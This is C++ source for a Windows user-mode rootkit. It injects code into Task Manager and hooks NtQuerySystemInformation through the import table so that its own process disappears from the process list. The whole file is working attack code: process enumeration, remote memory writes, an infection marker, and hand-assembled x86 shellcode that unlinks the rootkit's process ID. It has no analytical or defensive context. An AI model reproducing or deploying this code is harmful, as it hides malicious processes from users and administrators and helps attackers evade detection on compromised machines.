#include "rootkit.h"

RootKit::RootKit(){
	StartThread();
}

typedef BOOL (WINAPI *EnumProcessesP)(DWORD*, DWORD, DWORD*);
typedef BOOL (WINAPI *EnumProcessModulesP)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD (WINAPI *GetModuleFileNameExP)(HANDLE, HMODULE, LPTSTR, DWORD);
typedef DWORD (WINAPI *GetProcessImageFileNameP)(HANDLE, LPTSTR, DWORD);
typedef BOOL (WINAPI *IsWow64ProcessP) (HANDLE, PBOOL);

const DWORD MagicNumber = 0x10101011;

VOID RootKit::ThreadFunc(VOID){
	#ifdef _DEBUG
	dprintf("rootkit thread started\r\n");
	#endif
	BOOL Wow64 = FALSE;
	HMODULE Kernel32Dll;
	if(!(Kernel32Dll = LoadLibrary("kernel32.dll")))
		return;
	IsWow64ProcessP IsWow64ProcessF = (IsWow64ProcessP)GetProcAddress(Kernel32Dll, "IsWow64Process");
	if(IsWow64ProcessF){
		IsWow64ProcessF(GetCurrentProcess(), &Wow64);
		if(Wow64){
			#ifdef _DEBUG
			dprintf("running in 64 bit environment, stopping rootkit");
			#endif
			return;
		}else{
			#ifdef _DEBUG
			dprintf("not running in 64 bit environment, continue running rootkit");
			#endif
		}
	}

	HMODULE Dll;
	if(!(Dll = LoadLibrary("psapi.dll")))
		return;
	EnumProcessesP EnumProcessesF = (EnumProcessesP)GetProcAddress(Dll, "EnumProcesses");
	if(!EnumProcessesF)
		return;
	EnumProcessModulesP EnumProcessModulesF = (EnumProcessModulesP)GetProcAddress(Dll, "EnumProcessModules");
	if(!EnumProcessModulesF)
		return;
	GetModuleFileNameExP GetModuleFileNameExF = (GetModuleFileNameExP)GetProcAddress(Dll, "GetModuleFileNameExA");
	if(!GetModuleFileNameExF)
		return;
	GetProcessImageFileNameP GetProcessImageFileNameF = (GetProcessImageFileNameP)GetProcAddress(Dll, "GetProcessImageFileNameA");
	if(!GetProcessImageFileNameF)
		return;

	DWORD ProcessIDs[128];
	DWORD BytesReturned;
	while(1){
		EnumProcessesF(ProcessIDs, sizeof(ProcessIDs), &BytesReturned);
		//dprintf("\r\n\r\n%d process ids\r\n", BytesReturned / sizeof(DWORD));
		for(UINT i = 0; i < (BytesReturned / sizeof(DWORD)); i++){
			Process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, ProcessIDs[i]);
			if(Process){
				CHAR FileName[MAX_PATH];
				GetProcessImageFileNameF(Process, FileName, sizeof(FileName));
				PCHAR ExeName = strrchr(FileName, '\\') + 1;
				if((DWORD)ExeName == 1)
					ExeName = FileName;
				if(stricmp(ExeName, "taskmgr.exe") == 0){
					HMODULE Module;
					DWORD BytesNeeded;
					EnumProcessModulesF(Process, &Module, sizeof(Module), &BytesNeeded);
					GetModuleFileNameExF(Process, Module, FileName, sizeof(FileName));
					//dprintf("%d\t%X\t%s\r\n", ProcessIDs[i], Module, FileName);
					CHAR Buffer[1024];
					IMAGE_DOS_HEADER DosHeader;
					IMAGE_NT_HEADERS NtHeaders;
					DWORD BytesRead;
					DWORD BytesWritten;
					if(ReadProcessMemory(Process, (LPCVOID)Module, &DosHeader, sizeof(DosHeader), &BytesRead)){
						if(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + DosHeader.e_lfanew), &NtHeaders, sizeof(NtHeaders), &BytesRead)){
							if(NtHeaders.OptionalHeader.CheckSum == MagicNumber){
								//dprintf("already injected\r\n");
								CloseHandle(Process);
								continue;
							}else{
								DWORD OldProtect;
								BOOL Return = VirtualProtectEx(Process, (LPVOID)Module, NtHeaders.OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &OldProtect);
								CHAR Headers[0x1000];
								IMAGE_NT_HEADERS* NtHeadersP = (IMAGE_NT_HEADERS*)(Headers + DosHeader.e_lfanew);
								if(ReadProcessMemory(Process, (LPCVOID)Module, &Headers, NtHeaders.OptionalHeader.SizeOfHeaders > sizeof(Headers) ? sizeof(Headers) : NtHeaders.OptionalHeader.SizeOfHeaders, &BytesRead)){
									if(WriteProcessMemory(Process, (LPVOID)(PBYTE(Module) + DosHeader.e_lfanew + ((PBYTE)&NtHeaders.OptionalHeader.CheckSum - (PBYTE)&NtHeaders)), &MagicNumber, sizeof(MagicNumber), &BytesWritten)){
										//dprintf("injecting...\r\n");
										if((AllocatedMemory = VirtualAllocEx(Process, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE))){
											//dprintf("Allocated memory at %X\r\n", AllocatedMemory);
											//VirtualFreeEx(Process, Address, 0x1000, MEM_RELEASE);
											//dprintf("%X\r\n\r\n", ImportSymbolsAddress);
											for(UINT i = 0; i < NtHeaders.OptionalHeader.DataDirectory[1].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR); i++){
												//dprintf("%X\r\n", (PBYTE(Module) + ImportSymbolsAddress + (i * sizeof(IMAGE_IMPORT_DESCRIPTOR))));
												IMAGE_IMPORT_DESCRIPTOR ImportDescriptor;
												if(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + NtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress + (i * sizeof(IMAGE_IMPORT_DESCRIPTOR))), &ImportDescriptor, sizeof(ImportDescriptor), &BytesRead)){
													if(ImportDescriptor.Name){
														CHAR DllName[32];
														if(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + ImportDescriptor.Name), DllName, sizeof(DllName), &BytesRead)){
															if(stricmp(DllName, "ntdll.dll") == 0){
																//dprintf("found %s\r\n", DllName);
																IMAGE_THUNK_DATA ThunkData;
																DWORD OriginalFirstThunk = ImportDescriptor.OriginalFirstThunk;
																DWORD FirstThunk = ImportDescriptor.FirstThunk;
																while(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + OriginalFirstThunk), &ThunkData, sizeof(ThunkData), &BytesRead) && ThunkData.u1.AddressOfData){																
																	CHAR Buffer[34];
																	IMAGE_IMPORT_BY_NAME* ImportByName = (IMAGE_IMPORT_BY_NAME*)Buffer;
																	if(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + ThunkData.u1.AddressOfData), &Buffer, sizeof(Buffer), &BytesRead)){
																		if(strcmp((PCHAR)ImportByName->Name, "NtQuerySystemInformation") == 0){
																			IMAGE_THUNK_DATA NewThunkData;
																			if(ReadProcessMemory(Process, (LPCVOID)(PBYTE(Module) + FirstThunk), &NewThunkData, sizeof(NewThunkData), &BytesRead)){
																				//dprintf("hooking %s() 0x%X\r\n", ImportByName->Name, NewThunkData.u1.Function);
																				HookNtQuerySystemInformation(PBYTE(Module) + FirstThunk, (LPVOID)NewThunkData.u1.Function);
																			}
																		}
																	}
																	OriginalFirstThunk += sizeof(IMAGE_THUNK_DATA);
																	FirstThunk += sizeof(IMAGE_THUNK_DATA);
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			CloseHandle(Process);
		}
		Sleep(50);
	}
}

VOID RootKit::HookNtQuerySystemInformation(LPVOID Address, LPVOID OriginalAddress){
	DWORD BytesWritten;
	CHAR Code[] = {
		0x55,									// PUSH EBP
		0x8B,0xEC,								// MOV EBP, ESP
		0xFF,0x75,0x14,							// PUSH DWORD PTR [EBP+14]
		0xFF,0x75,0x10,							// PUSH DWORD PTR [EBP+10]
		0xFF,0x75,0x0C,							// PUSH DWORD PTR [EBP+C]
		0xFF,0x75,0x08,							// PUSH DWORD PTR [EBP+8]
		0xE8,0x00,0x00,0x00,0x00,				// CALL NtQuerySystemInformation
		0x53,									// PUSH EBX
		0x50,									// PUSH EAX
		0x52,									// PUSH EDX
		0x83,0xF8,0x00,							// CMP EAX, 0
		0x75,0x2C,								// JNZ end
		0x83,0x7D,0x08,0x05,					// CMP DWORD PTR [EBP+8], 5
		0x75,0x26,								// JNZ end
		0x8B,0x45,0x0C,							// MOV EAX, DWORD PTR [EBP+C]
		0x8B,0xD0,								// MOV EDX, EAX
												//  loop:
		0x81,0x78,0x44,0x00,0x00,0x00,0x00,		// CMP DWORD PTR [EAX+44], ProcessID
		0x8B,0x18,								// MOV EBX, DWORD PTR [EAX]
		0x75,0x0D,								// JNZ skip1
		0x83,0x38,0x00,							// CMP DWORD PTR [EAX], 0
		0x75,0x06,								// JNZ skip0
		0x33,0xDB,								// XOR EBX, EBX
		0x89,0x1A,								// MOV DWORD PTR [EDX], EBX
		0xEB,0x02,								// JMP skip
												//  skip0:
		0x01,0x1A,								// ADD DWORD PTR [EDX], EBX
												//  skip1:
		0x8B,0xD0,								// MOV EDX, EAX
		0x03,0xC3,								// ADD EAX, EBX
		0x83,0xFB,0x00,							// CMP EBX, 0
		0x75,0xDF,								// JNZ loop
												//  end:
		0x5A,									// POP EDX
		0x58,									// POP EAX
		0x5B,									// POP EBX
		0x5D,									// POP EBP
		0xC2,0x10,0x00							// RETN 10
	};
	DWORD NtQueryInformationAddressE = DWORD(OriginalAddress) - DWORD(AllocatedMemory) - 16 - 4;
	memcpy(&Code[16], &NtQueryInformationAddressE, sizeof(NtQueryInformationAddressE));
	DWORD ProcessID = GetCurrentProcessId();
	memcpy(&Code[42], &ProcessID, sizeof(ProcessID));
	//dprintf("%X %X\r\n", AllocatedMemory, Address);
	IMAGE_THUNK_DATA ReplaceThunk;
	ReplaceThunk.u1.Function = (DWORD)AllocatedMemory;
	if(WriteProcessMemory(Process, AllocatedMemory, Code, sizeof(Code), &BytesWritten)){
		if(WriteProcessMemory(Process, Address, &ReplaceThunk, sizeof(ReplaceThunk), &BytesWritten)){
			//dprintf("%d\r\n", BytesWritten);
		}
	}
}